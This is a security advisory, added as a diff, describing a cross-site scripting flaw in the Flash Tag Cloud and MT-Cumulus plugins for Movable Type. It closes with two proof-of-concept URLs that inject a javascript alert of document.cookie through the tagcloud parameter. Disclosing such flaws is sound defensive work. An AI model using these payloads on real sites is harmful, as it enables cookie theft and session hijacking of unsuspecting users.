@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/47845/info
+
+The Flash Tag Cloud widget and the MT-Cumulus Plugin are prone to a cross-site scripting vulnerability because they fail to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+The following versions are affected:
+
+Flash Tag Cloud For MT 4
+MT-Cumulus 1.02 and prior versions 
+
+http://www.example.com/scripts/tagcloud.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href='javascript:alert(document.cookie)'+style='font-size:+40pt'%3EClick%20me%3C/a%3E%3C/tags%3E
+
+http://www.example.com/mt/mt-static/plugins/Cumulus/tagcloud.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href='javascript:alert(document.cookie)'+style='font-size:+40pt'%3EClick%20me%3C/a%3E%3C/tags%3E 
